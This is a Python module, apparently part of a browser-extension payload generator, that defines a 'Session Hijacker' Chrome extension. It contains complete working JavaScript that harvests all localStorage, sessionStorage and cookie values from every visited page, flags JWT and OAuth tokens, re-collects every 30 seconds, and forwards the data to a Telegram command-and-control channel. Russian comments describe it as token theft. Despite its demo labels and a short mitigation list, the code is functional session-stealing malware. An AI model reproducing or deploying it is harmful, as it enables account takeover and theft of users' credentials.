from .base import BasePayload, Payload


class SessionHijacker(BasePayload):
    def get_payload(self) -> Payload:
        return Payload(
            id="session_hijacker",
            name="Session Hijacker",
            description="Кража токенов из localStorage/sessionStorage. Отправляет в Telegram.",
            icon="🔑",
            risk_level="critical",
            permissions=["<all_urls>", "storage", "cookies", "tabs"],
            targets=[
                "JWT tokens",
                "session IDs",
                "OAuth tokens",
                "refresh tokens",
                "API keys",
            ],
            demo_instructions=(
                "1. Установите расширение\n"
                "2. Войдите на сайт\n"
                "3. Токены придут в Telegram"
            ),
            mitigation=[
                "Храните токены в HttpOnly cookies",
                "Короткое время жизни токенов",
                "Привязка токена к IP/UA",
                "Refresh token rotation",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
// ============================================================
// Session Hijacker — C2
// ============================================================

console.log('[DEMO] Session Hijacker: background loaded');

let sessionsCaptured = [];

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'session_data') {
        const entry = {
            timestamp: new Date().toISOString(),
            url: sender.tab?.url || msg.url,
            localStorage: msg.localStorage || {},
            sessionStorage: msg.sessionStorage || {},
            hasJWT: msg.hasJWT,
            hasOAuth: msg.hasOAuth,
            cookies: msg.cookies || {},
        };

        sessionsCaptured.push(entry);
        console.log('[DEMO] Session captured:', {
            url: entry.url,
            localStorageKeys: Object.keys(entry.localStorage),
            hasJWT: entry.hasJWT,
        });

        chrome.action.setBadgeText({ text: String(sessionsCaptured.length) });
        chrome.action.setBadgeBackgroundColor({ color: '#F44336' });

        chrome.storage.local.set({
            demo_sessions_captured: sessionsCaptured.length,
            demo_last_session: entry,
        });

        // C2
        if (typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled) {
            let text = `🔑 <b>Session Hijacker</b>\n`;
            text += `Сессия: <code>${C2_CONFIG.sessionId}</code>\n`;
            text += `URL: <code>${c2Escape(entry.url || '')}</code>\n`;
            text += `JWT: ${entry.hasJWT ? '✅' : '❌'}\n`;
            text += `OAuth: ${entry.hasOAuth ? '✅' : '❌'}\n\n`;

            // localStorage
            const lsKeys = Object.keys(entry.localStorage);
            if (lsKeys.length > 0) {
                text += `<b>localStorage (${lsKeys.length}):</b>\n`;
                for (const key of lsKeys.slice(0, 5)) {
                    const val = entry.localStorage[key];
                    text += `  🔑 <b>${c2Escape(key)}</b>: <code>${c2Escape(String(val).substring(0, 100))}</code>\n`;
                }
            }

            // JSON
            const jsonData = {
                session_id: C2_CONFIG.sessionId,
                timestamp: new Date().toISOString(),
                total: sessionsCaptured.length,
                sessions: sessionsCaptured,
            };
            const filename = `sessions_${C2_CONFIG.sessionId}_${Date.now()}.json`;
            c2SendDocument(filename, JSON.stringify(jsonData, null, 2));

            c2Send(text);
        }

        sendResponse({ status: 'ok' });
    }

    if (msg.action === 'get_session_stats') {
        chrome.storage.local.get(
            ['demo_sessions_captured', 'demo_last_session'],
            (data) => sendResponse(data)
        );
        return true;
    }
});
"""

    def get_content_js(self) -> str:
        return r"""
// ============================================================
// Session Hijacker — Content Script
// ============================================================

console.log('[DEMO] Session Hijacker: content script loaded');

function collectStorage() {
    const localStorageData = {};
    const sessionStorageData = {};
    let hasJWT = false;
    let hasOAuth = false;

    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key) || '';
            localStorageData[key] = value;  // ПОЛНЫЕ данные

            if (value.match(/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/)) {
                hasJWT = true;
            }
            if (key.toLowerCase().includes('oauth') || key.toLowerCase().includes('token')) {
                hasOAuth = true;
            }
        }

        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key) || '';
        }
    } catch (e) {
        console.log('[DEMO] Storage error:', e.message);
    }

    // Куки
    const cookies = {};
    try {
        document.cookie.split(';').forEach(c => {
            const [name, ...rest] = c.trim().split('=');
            if (name) cookies[name] = rest.join('=');
        });
    } catch (e) {}

    if (Object.keys(localStorageData).length > 0 ||
        Object.keys(sessionStorageData).length > 0 ||
        Object.keys(cookies).length > 0) {
        chrome.runtime.sendMessage({
            action: 'session_data',
            url: location.href,
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            cookies: cookies,
            hasJWT,
            hasOAuth,
        });
    }
}

// При загрузке
collectStorage();

// При изменениях
window.addEventListener('storage', collectStorage);

// Каждые 30 сек
setInterval(collectStorage, 30000);
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_session_stats' }, (data) => {
    if (data && data.demo_sessions_captured) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_sessions_captured;
    }
});
"""


__all__ = ["SessionHijacker"]
